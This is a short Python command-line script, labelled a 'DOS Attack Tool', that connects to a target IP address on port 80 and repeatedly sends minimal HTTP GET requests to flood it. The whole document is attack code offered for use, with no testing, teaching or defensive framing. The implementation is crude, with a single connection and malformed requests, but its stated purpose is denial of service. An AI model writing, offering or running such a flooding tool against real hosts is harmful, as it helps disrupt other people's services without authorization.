import argparse
import socket

def dos_attack(target_ip, request_count):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, 80))
        for _ in range(request_count):
            s.sendall(b"GET / HTTP/1.1\r\n\r\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DOS Attack Tool")
    parser.add_argument("-t", "--target", help="Target IP address", required=True)
    parser.add_argument("-r", "--request_count", help="Number of requests", type=int, default=100)
    args = parser.parse_args()

    dos_attack(args.target, args.request_count)
